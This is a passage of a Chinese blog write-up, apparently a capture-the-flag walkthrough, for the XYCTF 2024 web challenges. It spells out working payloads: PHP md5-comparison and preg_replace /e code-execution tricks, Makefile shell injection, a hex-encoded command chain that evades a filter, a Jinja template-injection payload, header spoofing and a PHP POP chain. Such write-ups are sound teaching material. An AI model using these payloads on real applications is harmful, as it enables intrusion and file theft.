@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="学校要期中考试所以只能写第一周的web了（电脑被收了 悲），当时牢大那个题容器坏了，后来拿手机勉强做了一下ezclass，ezRCE，信息课上偷偷打了ezSerialize和牢大（）），各位大佬们凑合着看吧 拿手机打了两道题，实在被手机端的操作整红温了（菜就多练），再加上那个手机端的wss更是雪上加">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XYCTF 2024 web week1 wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="学校要期中考试所以只能写第一周的web了（电脑被收了 悲），当时牢大那个题容器坏了，后来拿手机勉强做了一下ezclass，ezRCE，信息课上偷偷打了ezSerialize和牢大（）），各位大佬们凑合着看吧 拿手机打了两道题，实在被手机端的操作整红温了（菜就多练），再加上那个手机端的wss更是雪上加">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-26T12:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-26T12:18:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>XYCTF 2024 web week1 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-06-01-litctf-2024-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&text=XYCTF 2024 web week1 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&is_video=false&description=XYCTF 2024 web week1 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XYCTF 2024 web week1 wp&body=Check out this article: https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&title=XYCTF 2024 web week1 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&name=XYCTF 2024 web week1 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-04-26-xyctf-2024-web-week1-wp/&t=XYCTF 2024 web week1 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#warm-up"><span class="toc-number">1.1.</span> <span class="toc-text">warm up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezmake"><span class="toc-number">1.2.</span> <span class="toc-text">ezmake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-make"><span class="toc-number">1.3.</span> <span class="toc-text">ez?make</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezmd5"><span class="toc-number">1.4.</span> <span class="toc-text">ezmd5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">1.5.</span> <span class="toc-text">我是一个复读机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezhttp"><span class="toc-number">1.6.</span> <span class="toc-text">ezhttp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-number">1.7.</span> <span class="toc-text">ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezclass"><span class="toc-number">1.8.</span> <span class="toc-text">ezclass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezRCE"><span class="toc-number">1.9.</span> <span class="toc-text">ezRCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezSerialize"><span class="toc-number">1.10.</span> <span class="toc-text">ezSerialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7"><span class="toc-number">1.11.</span> <span class="toc-text">牢牢记住，逝者为大</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezLFI-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.12.</span> <span class="toc-text">ezLFI(赛后复现)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        XYCTF 2024 web week1 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-26T12:18:00.000Z" class="dt-published" itemprop="datePublished">2024-04-26</time>
+        
+        (Updated: <time datetime="2024-04-26T12:18:00.000Z" class="dt-updated" itemprop="dateModified">2024-04-26</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>学校要期中考试所以只能写第一周的web了（电脑被收了 悲），当时牢大那个题容器坏了，后来拿手机勉强做了一下ezclass，ezRCE，信息课上偷偷打了ezSerialize和牢大（）），各位大佬们凑合着看吧</p>
+<p>拿手机打了两道题，实在被手机端的操作整红温了（菜就多练），再加上那个手机端的wss更是雪上加霜，只能放弃后面的题了，望佬们轻点喷</p>
+<p>整体WEB题目偏简单，这才好嘛，第一周的WEB题ak了，甚至我还有时间提前写wp</p>
+<p>牢大那个题一开始容器坏了，这下真坠机了（不过后来又修好了）（））</p>
+<p>这次有很多关于进制编码绕过的linux RCE，可能是oSthing对它情有独钟吧</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">web</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">warm up</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">ezmake</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">ez?make</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">ezmd5</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">我是一个复读机</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.6">ezhttp</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.7">ezpop</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.8">ezclass</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.9">ezRCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.10">ezSerialize</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.11">牢牢记住，逝者为大</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.12">ezLFI(赛后复现)</a></li>
+</ul>
+<p>其他题我们先不管他，等我期中考完拿到电脑再做吧(￣▽￣)”</p>
+<p>ps: wp的顺序是按照我的做题顺序来的</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>难度：热身</p>
+<p>开容器直接代码糊脸：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;next.php&#x27;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$XYCTF = &quot;Warm up&quot;;</span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;val1&#x27;]) &amp;&amp; isset($_GET[&#x27;val2&#x27;]) &amp;&amp; $_GET[&#x27;val1&#x27;] != $_GET[&#x27;val2&#x27;] &amp;&amp; md5($_GET[&#x27;val1&#x27;]) == md5($_GET[&#x27;val2&#x27;])) &#123;</span><br><span class="line">    echo &quot;ez&quot; . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;什么情况,这么基础的md5做不来&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($md5) &amp;&amp; $md5 == md5($md5)) &#123;</span><br><span class="line">    echo &quot;ezez&quot; . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;什么情况,这么基础的md5做不来&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($XY == $XYCTF) &#123;</span><br><span class="line">    if ($XY != &quot;XYCTF_550102591&quot; &amp;&amp; md5($XY) == md5(&quot;XYCTF_550102591&quot;)) &#123;</span><br><span class="line">        echo $level2;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;什么情况,这么基础的md5做不来&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;学这么久,传参不会传?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>观察代码发现有一个明显的extract($_GET);一眼变量覆盖漏洞</p>
+<p>第一个if代码块要求：</p>
+<p><strong>get传参val1，val2，它们不相同但它们的MD5弱比较（&#x3D;&#x3D;）返回真</strong></p>
+<p>数组绕过，科学计数法也可以（懒）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：val1[]=a&amp;val2[]=b</span><br></pre></td></tr></table></figure>
+
+<p>第二个if代码块要求：</p>
+<p><strong>变量md5的MD5值与它本身弱比较（&#x3D;&#x3D;）返回真</strong></p>
+<p>由于有变量覆盖漏洞，所以直接GET传md5值就行</p>
+<p>这里有个知识点就是0e215962017这个字符串的MD5是和它本身弱等于的（都是0e开头）</p>
+<p>（不知道的其实可以直接开浏览器查或者chatgpt）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：md5=0e215962017 </span><br></pre></td></tr></table></figure>
+
+<p>第三个if代码块要求:</p>
+<p><strong>变量XY弱等于变量XYCTF，且XY的值不等于XYCTF_550102591，而它们的md5弱比较（&#x3D;&#x3D;）返回真</strong></p>
+<p>这里你可能会遇上整个ctf之旅的第一个卡点，但是不难发现XYCTF_550102591其实是一个出题人特制的字符串</p>
+<p>md5(‘XYCTF_550102591’) &#x3D; ‘0E937920457786991080577371025051’</p>
+<p>直接变量覆盖+科学计数法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：XY=QNKCDZO&amp;XYCTF=QNKCDZO // md5(&#x27;QNKCDZO&#x27;) = &#x27;0E830400451993494058024219903391&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>得到输出LLeeevvveeelll222.php，进入下一关</p>
+<p>进入level2，又是代码糊脸：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;, $_POST[&#x27;a&#x27;]) &amp;&amp; intval($_POST[&#x27;a&#x27;])) &#123;</span><br><span class="line">    echo &quot;操作你O.o&quot;;</span><br><span class="line">    echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);  // 我可不会像别人一样设置10来个level</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;有点汗流浃背&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到注释直接感动哭了（bushi）</p>
+<p>第一个if代码块要求：</p>
+<p><strong>POST了一个变量a，它不包含数字，但intval($a)返回真</strong></p>
+<p>intval参数如果是有内容的数组返回1，可以用这个特性操作它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST：a[]=1 </span><br></pre></td></tr></table></figure>
+
+<p>然后就简单了，preg_replace的RCE：&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：a=/test/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=&quot;just test&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LEVEL1:</span><br><span class="line">GET: ?val1[]=a&amp;val2[]=b&amp;md5=0e215962017&amp;XY=QNKCDZO&amp;XYCTF=QNKCDZO</span><br><span class="line">LEVEL2: </span><br><span class="line">GET: ?a=/test/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=&quot;just test&quot;</span><br><span class="line">POST: a[]=1</span><br></pre></td></tr></table></figure>
+
+<p>总结：感谢来自oSthing的两百分O(∩_∩)O</p>
+<h2 id="ezmake"><a href="#ezmake" class="headerlink" title="ezmake"></a>ezmake</h2><p>难度：热身</p>
+<p>makefile里面可以用$(shell {cmd})执行命令，用cat查看flag就行（没错啥也没过滤）</p>
+<p>这里贴上makefile.php代码过滤输入的那行(ls出来的)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/\/|\n|\r|\;|\|/i&#x27;, $cmd))</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(shell cat flag)</span><br></pre></td></tr></table></figure>
+
+<p>总结：比warmup还简单，网上搜makefile现学现卖就行；而且这过滤是认真的嘛</p>
+<h2 id="ez-make"><a href="#ez-make" class="headerlink" title="ez?make"></a>ez?make</h2><p>难度：”简单”</p>
+<p>简单个jb，个人感觉是第一批题目里最难的，做到这里肃然起敬了</p>
+<p>这题其实题目出了一点小问题，FLAG变量的值是.&#x2F;flag应该在同目录下，结果找了半天发现在根目录XD（后来修了）</p>
+<p><em>（我的解法很奇怪，大概率非预期，大佬们看完别笑了真的）</em></p>
+<p>过滤很严格，f,l,a,g,?,*,&#x2F;全给你扬了(还有别的)</p>
+<p><em>知识点1:反引号内的内容被当作bash执行</em></p>
+<p>到这里基本有思路了，就是``的rce嘛</p>
+<p>然后我就卡住了，这破题这也不让用那也不让用，期间我破防试着用了env看环境变量，结果不知道出题人怎么想的在环境变量里搞个GZCTF_flag&#x3D;no_flag。搞得我以为是跟这个环境变量有关呢，在这里卡了半天</p>
+<p><em>知识点2:xxd编码（base64中含有’a’不能用）</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;ls&#x27; | xxd -p  // 6c73</span><br><span class="line">echo &#x27;6c73&#x27; | xxd -p -r // ls</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &#x27;6c73&#x27; | xxd -p -r` // 执行ls</span><br></pre></td></tr></table></figure>
+
+<p>到这里，真正的折磨才开始</p>
+<p>ls列出目录下的文件有：Makefile, makefile.php, index.html</p>
+<p>FLAG 呢？！！ ……flag在根目录下</p>
+<p>这还不简单？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;cat /flag&#x27; | xxd -p  // 636174202f666c6167</span><br></pre></td></tr></table></figure>
+
+<p>我本来也以为结束了，但是’636174202f666c6167’这段字符串里含有’f’（含有f,l,a,g都不能用）!</p>
+<p>后来看了一下，’&#x2F;‘这个字符被xxd转化之后是2f……</p>
+<p><em>知识点3:&amp;&amp;命令连接符</em></p>
+<p>很好，接下来只需要用&amp;&amp;来cd就行了</p>
+<p>先cd进根目录，然后就可以直接用flag获取而不是&#x2F;flag了</p>
+<p>但是，但是怎么不用’&#x2F;‘回到根目录啊</p>
+<p><em>知识点4:直接cd后面不接参数会回到home目录，home目录的上级文件夹的上级文件夹就是根目录</em></p>
+<p>最后的最后，sort构造出来的字符串中含有’f’字符不能用（不信你可以试试），用less查看flag(cat也行)</p>
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`echo 6364|xxd -p -r`&amp;&amp;`echo 6364202e2e|xxd -p -r` &amp;&amp;`echo 6364202e2e|xxd -p -r` &amp;&amp;`echo 6c65737320666c6167|xxd -p -r`</span><br><span class="line">// cd &amp;&amp; cd .. &amp; cd .. &amp; less flag</span><br></pre></td></tr></table></figure>
+
+<p>总结：你管这叫ez？</p>
+<h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>难度：签到甚至是热身</p>
+<p>巨简单，直接fastcoll碰撞两个一样的图片就拿flag了（图片不能太大否则报错）</p>
+<p>直接创建一个一像素的图片拖到fastcoll里碰撞即可</p>
+<p>一像素图片给佬们贴在这里了：<a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/blogs/820580/%E4%B8%80%E5%83%8F%E7%B4%A0%E5%9B%BE%E7%89%87_%E7%A2%B0%E6%92%9E%E7%94%A8.zip">https://files.cnblogs.com/files/blogs/820580/一像素图片_碰撞用.zip</a></p>
+<p>总结：最善良的一集，甚至是隔壁qsnctf的原题（好像crypto里那个factor1也是原题，只不过把平方改成立方了，难绷）</p>
+<h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>难度：简单</p>
+<p>进去直接爆破密码</p>
+<blockquote>
+<p>用户名：admin，密码：asdqwe</p>
+</blockquote>
+<p>进去一个输入框，输入汉字有报错信息‘我只认识你说的英文，{（汉字之外的信息）}’</p>
+<p>尝试xss发现有弹窗（输入img src&#x3D;1 onclick&#x3D;”alert(‘xss’);”两边记得加上尖括号）</p>
+<p>cookie里没东西，但是一般_ctf里有xss的时候就优先考虑ssti_，不过{被过滤</p>
+<p>注意到报错的时候有{}</p>
+<p>这不就是白给的大括号吗？？？</p>
+<p>联想到{{}}与{%%}相等而且没有过滤%</p>
+<p>输入‘%7 * 7%一’的时候由于有汉字‘一’所以进行报错，报错信息为‘我只认识你说的英文，{%7 * 7%}’，触发漏洞输出‘我只认识你说的英文，49’</p>
+<p>到这里基本上确诊为jinja的ssti了</p>
+<p>发现过滤了下划线，引号等等，但没过滤request</p>
+<p>显然得出payload</p>
+<p><strong>最终payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=__globals__&amp;b=os&amp;c=cat /flag&amp;sentence=%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%一</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>难度：签到</p>
+<p>简单题，ez系列最诚实的两题之一（还有一个是ezmd5）</p>
+<p>进去是一个登录框，注意到有robots.txt，里面有Disallow: &#x2F;l0gin.txt，进l0gin.txt得到用户名密码</p>
+<blockquote>
+<p>username: XYCTF password: @JOILha!wuigqi123$</p>
+</blockquote>
+<p>其他的知识点我放这了，佬们可以直接复制到http头里（记得去掉注释）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Referer: yuanshen.com // 从yuanshen.com来的</span><br><span class="line">User-Agent: XYCTF // 用XYCTF浏览器</span><br><span class="line">Client-IP: 127.0.0.1 // 本地用户，不用xff（X-Forward-For）</span><br><span class="line">Via: ymzx.qq.com // 从ymzx.qq.com代理</span><br><span class="line">Cookie: XYCTF // XYCTF的小饼干（Cookie）</span><br></pre></td></tr></table></figure>
+
+<p>总结：我也想吃XYCTF的小flag</p>
+<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>难度：简单</p>
+<p>首先看怎么利用</p>
+<p>众所周知，strrev函数可以把字符串倒过来再输出</p>
+<p>还是众所周知，implode函数可以将数组里的内容转为字符串</p>
+<p>所以POST就可以提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST: a=implode&amp;b=strrev</span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=&#x27;metsys&#x27; // system倒过来 , d=&#x27;cat /flag&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(implode,内容为&#x27;strrev&#x27;的array)(&#x27;metsys&#x27;)(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>等效于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strrev(&#x27;metsys&#x27;)(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>等效于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>然后瞪眼法出链子（好短的链子）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php</span><br><span class="line"></span><br><span class="line">...题目源码...</span><br><span class="line"></span><br><span class="line">$c = new CCC();</span><br><span class="line">$c -&gt; c = new AAA();</span><br><span class="line">$c -&gt; c -&gt; s = new BBB();</span><br><span class="line">$c -&gt; c -&gt; a = &#x27;hacku&#x27;;</span><br><span class="line">$c -&gt; c -&gt; s -&gt; c = &#x27;metsys&#x27;;</span><br><span class="line">$c -&gt; c -&gt; s -&gt; d = &#x27;cat /flag&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>接下来绕过</p>
